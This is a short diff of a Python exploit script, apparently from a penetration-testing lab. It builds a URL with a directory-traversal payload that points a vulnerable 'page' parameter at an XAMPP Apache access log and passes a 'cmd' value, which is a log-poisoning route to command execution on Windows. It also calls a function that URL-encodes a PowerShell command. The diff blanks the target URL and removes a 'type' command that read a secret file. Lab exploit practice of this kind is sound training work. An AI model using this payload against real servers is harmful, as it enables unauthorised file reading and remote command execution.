@@ -9,11 +9,11 @@ def url_encode_powershell_command():
     return encoded_command
 
 def main():
-    url = 'http://mountaindesserts.com/meteor/index.php?page='
+    url = ''
 
     win_payload = url_encode_powershell_command()
     print(win_payload)
-    payload = f'../../../../../../../../../../xampp/apache/logs/access.log&cmd=type%20hopefullynobodyfindsthisfilebecauseitssupersecret.txt'
+    payload = f'../../../../../../../../../../xampp/apache/logs/access.log&cmd='
     enc_payload = payload.replace('.', '%2E')
     full_url = f'{url}{enc_payload}'
     headers = {
